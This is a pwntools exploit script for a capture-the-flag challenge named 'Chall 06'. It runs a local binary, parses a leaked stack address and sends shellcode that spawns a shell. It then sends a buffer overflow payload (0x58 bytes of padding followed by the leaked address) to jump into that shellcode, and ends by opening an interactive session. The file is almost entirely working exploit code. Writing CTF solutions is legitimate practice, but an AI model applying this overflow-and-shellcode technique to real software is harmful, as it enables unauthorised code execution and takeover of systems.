from pwn import *
import re
'''
Chall 06
BOF/Shellcode
'''
binary = context.binary = ELF('./chall_06')
p = process(binary.path)
resp = p.recv()
re.findall(b"(0x[0-9a-f]{6,16})", resp)
addr = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)

print(hex(addr))

payload  = b''
payload += asm(shellcraft.sh())

p.sendline(payload)

payload  = b''
payload += (0x68 - 0x10) * b'A'
payload += p64(addr)
print("\n",payload,"\n")

p.sendline(payload)
p.interactive()
